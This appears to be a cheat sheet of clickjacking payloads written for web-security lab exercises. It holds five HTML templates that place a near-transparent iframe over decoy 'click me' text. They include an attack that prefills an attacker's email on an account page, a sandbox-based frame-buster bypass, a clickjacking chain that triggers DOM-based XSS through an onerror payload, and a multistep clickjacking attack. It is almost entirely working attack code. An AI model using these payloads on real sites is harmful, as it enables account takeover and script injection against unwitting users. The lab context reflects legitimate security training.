# Basic template

```html
<style>
iframe {
    position: relative;
    width: {};
    height: {};
    opacity: 0.0001;
    z-index: 2;
}


div {
    position: absolute;
    top: {};
    left: {};
    z-index: 1;
}
</style>

<div>click</div>
<iframe src="https://example.com/myaccount/">
</iframe>
```


# With form input value prefilled from a URL parameter
```html
<style>
iframe {
    position: relative;
    width: 1000px;
    height: 100%;
    opacity: 0.00001;
    z-index: 2;
}


div {
    position: absolute;
    top: 465px;
    left: 65px;
    z-index: 1;
}
</style>

<div>click me</div>
<iframe src="https://example.com/my-account?email=attacker@example.com">
</iframe>
```


# Busting Frame Buster
```html
<style>
iframe {
    top: 0;
    left: 0;
    position: relative;
    width: 100%;
    height: 100%;
    opacity: 0.1;
    z-index: 2;
    margin: 0;
    padding: 0;
    border: 0;
}


div {
    position: absolute;
    top: 465px;
    left: 65px;
    z-index: 1;
}
</style>

<div>click me</div>
<iframe sandbox="allow-forms" src="https://example.com/my-account?email=attacker@example.com">
</iframe>
```


# Exploiting clickjacking vulnerability to trigger DOM-based XSS
```html
<style>
iframe {
    position: relative;
    width: 1000px;
    height: 200px;
    opacity: 0.00001;
    z-index: 2;
}


div {
    position: absolute;
    top: 120px;
    left: 65px;
    z-index: 1;
}
</style>

<div>click me</div>
<iframe src="https://0a7f0029042405a1804730750088006f.web-security-academy.net/feedback?name=%3cimg+src%3dx+onerror%3dprint()%3e&email=test%40test.com&subject=test&message=test#feedbackResult">
</iframe>
```


# Lab: Multistep clickjacking
```html
<style>
iframe {
position: relative;
width: 1000px;
height: 1000px;
opacity: 0.00001;
z-index: 2;
}



div#div-1 {
    position: absolute;
    top: 514px;
    left: 55px;
    z-index: 1;
}

div#div-2 {
    position: absolute;
    top: 312px;
    left: 215px;
    z-index: 1;
}

</style>

<div id="div-1">Click me first</div>
<div id="div-2">Click me next</div>
<iframe src="https://0aa4002a04f4087b80969ee0005e001c.web-security-academy.net/my-account">

</iframe>
```